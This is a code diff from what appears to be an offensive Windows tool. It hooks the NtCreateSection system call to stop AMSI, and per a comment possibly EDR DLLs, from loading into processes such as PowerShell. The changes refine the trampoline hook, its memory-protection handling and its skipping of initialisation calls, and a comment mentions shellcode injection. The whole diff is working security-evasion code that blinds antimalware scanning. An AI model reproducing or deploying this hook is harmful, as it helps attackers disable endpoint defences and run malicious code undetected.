@@ -55,15 +55,21 @@ __stdcall NTSTATUS restore_hook_ntcreatesection(HANDLE* hSection, ACCESS_MASK De
     myNtCreateSection NtCreate;
     NtCreate = (myNtCreateSection)_ntCreateSection_address;
     myNtCreateSection ProtectPointer = NtCreate;
-    DWORD written2;//, written3;
+    DWORD oldprotect;
     SIZE_T syscallSize = (SIZE_T)24;
  
-    // Temporarily restore RWX, so that we can place the hook again.
-	((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &written2);
+    // Temporarily set RWX, so that we can place the hook again.
+	((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer, (PULONG)&syscallSize, PAGE_EXECUTE_READWRITE, &oldprotect);
         
     my_memcpy(NtCreate, originalBytes, 24); // Write the real NtCreateSection in the address of the hook
 
-    // Call the real NtCreateSection with original parameters to not break anything.
+    // Restore RX for execution.
+    /*SIZE_T syscallSize2 = (SIZE_T)24;
+    myNtCreateSection ProtectPointer2 = NtCreate;
+    ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&ProtectPointer2, (PULONG)&syscallSize2, PAGE_EXECUTE_READ, &oldprotect);
+    */
+    
+    // Call the real NtCreateSection with original parameters.
     NTSTATUS originalReturn =  NtCreate(hSection, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
     
     if (hook_ntcreateSection()) //re-hook it
@@ -240,8 +246,8 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
     // There are some use cases (e.G. ThreadlessInject Shellcode execution), in which we don't want to interrupt the process initialization (which also uses NtCreateSection).
     // For those Use-Cases, we have the option to skip one or more NtCreateSection Calls before actually doing something in the hook function.
     // Uncommented, as this function leads to us needing RWX Permissions all over the time. And the hook looks "better" when set to RX only.
-    /*
-    if (my_charcmp((char*)firstRun, (char*)&check, 1) == 0)
+    
+	if (my_charcmp((char*)firstRun, (char*)&check, 1) == 0) // process initialization only called NtCreateSection once in my tests
     {
         nomoreSkip = TRUE;
     }
@@ -250,11 +256,11 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
         // increase the value of firstRun by once
         increaseChar((char*)firstRun);
     }
-    */
+    
 
 
     char* lpFilename[256];
-    if ((FileHandle != NULL)/*&& nomoreSkip == TRUE*/)
+    if ((FileHandle != NULL) && nomoreSkip == TRUE)
     {
         if (my_GetFinalPathNameByHandleA(FileHandle, (char*)lpFilename, 256) != 0)
         {
@@ -269,6 +275,7 @@ __stdcall NTSTATUS ntCreateMySection(HANDLE* hSection, ACCESS_MASK DesiredAccess
                 log_to_file(amsiLog);
 
                 return 0xC0000054; // 0 does not work here, as Powershell than tries to use AMSI and the process crashes. So we're using STATUS_FILE_LOCK_CONFLICT to inform about the Section wasn't creatable.
+                // but 0 might is the better approach for EDR DLLs, as you won't prompt an GUI error notification with that.
 
             }
             
@@ -297,19 +304,14 @@ BOOL hook_ntcreateSection()
 
     DWORD written;
     SIZE_T syscallSize = (SIZE_T)24;
-    //((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)(-1, (PVOID)&NtCreate, &syscallSize, PAGE_EXECUTE_READWRITE, &written);
     
-    void* reference = (void*)ntCreateMySection; //pointer to ntCreateSection  (hook) in reference &
-
-	//my_memcpy(originalBytes, NtCreate, 16); // store the original bytes of the function we are hooking into our originalbytes function
-
+    void* reference = (void*)ntCreateMySection;
+    
     my_memcpy(&trampoline_MyNtCreateSection[2], &reference, sizeof reference); //Copy  the hook to tramp_ntcreatesection
-
-    //((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)(-1, (PVOID)&NtCreate, &syscallSize, PAGE_EXECUTE_READWRITE, &written3);
     
     my_memcpy((LPVOID*)NtCreate, &trampoline_MyNtCreateSection, sizeof trampoline_MyNtCreateSection); // actually do the hook by overwriting the original NtCreateSection
 
-    //((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);
+    ((NTPROTECTVIRTUALMEMORY)_NtProtectVirtualMemory)((HANDLE)-1, (PVOID)&NtCreate, (PULONG)&syscallSize, PAGE_EXECUTE_READ, &written);
 
 
     return TRUE;
